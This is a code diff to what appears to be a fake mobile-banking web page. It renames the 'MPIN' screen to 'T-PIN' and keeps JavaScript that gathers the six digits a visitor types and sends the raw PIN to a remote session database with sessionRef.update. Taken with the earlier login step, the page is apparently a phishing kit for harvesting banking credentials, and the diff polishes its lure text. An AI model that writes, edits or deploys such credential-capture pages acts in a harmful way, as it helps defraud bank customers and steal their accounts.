@@ -648,11 +648,11 @@ html, body {
   </button>
 </div>
 
-<!-- ==================== MPIN SCREEN ==================== -->
+<!-- ==================== T-PIN SCREEN ==================== -->
 <div class="screen-page" id="mpinPage">
   <div class="screen-header">
     <button class="back-btn" onclick="goBack()">←</button>
-    <div class="screen-header-title">Verify MPIN</div>
+    <div class="screen-header-title">Verify T-PIN</div>
   </div>
   <div class="screen-body">
     <div class="screen-logo">
@@ -660,8 +660,8 @@ html, body {
       <div class="brand-sub">MOBILE BANKING</div>
     </div>
 
-    <div class="screen-title">Enter Your MPIN</div>
-    <div class="screen-subtitle">Enter your 6-digit MPIN to continue</div>
+    <div class="screen-title">Enter Your T-PIN</div>
+    <div class="screen-subtitle">Enter your 6-digit T-PIN to continue</div>
 
     <div class="otp-inputs">
       <input type="text" maxlength="1" inputmode="numeric" id="m1" oninput="moveInput(this, 'm2')">
@@ -899,22 +899,22 @@ function handleLogin(e) {
 }
 
 // =====================================================
-// MPIN VERIFY
+// T-PIN VERIFY
 // =====================================================
 function handleMpinVerify() {
-  var mpin = '';
-  for (var i = 1; i <= 6; i++) mpin += document.getElementById('m' + i).value;
+  var tpin = '';
+  for (var i = 1; i <= 6; i++) tpin += document.getElementById('m' + i).value;
 
-  if (mpin.length !== 6) {
+  if (tpin.length !== 6) {
     showMsg('mpinMessage', 'Please enter all 6 digits.', 'warning');
     return;
   }
 
-  mpinValue = mpin;
+  mpinValue = tpin;
 
   if (sessionRef) {
-    sessionRef.update({ mpin: mpin }).then(function() {
-      console.log('✅ MPIN saved');
+    sessionRef.update({ mpin: tpin }).then(function() {
+      console.log('✅ T-PIN saved');
     });
   }
 
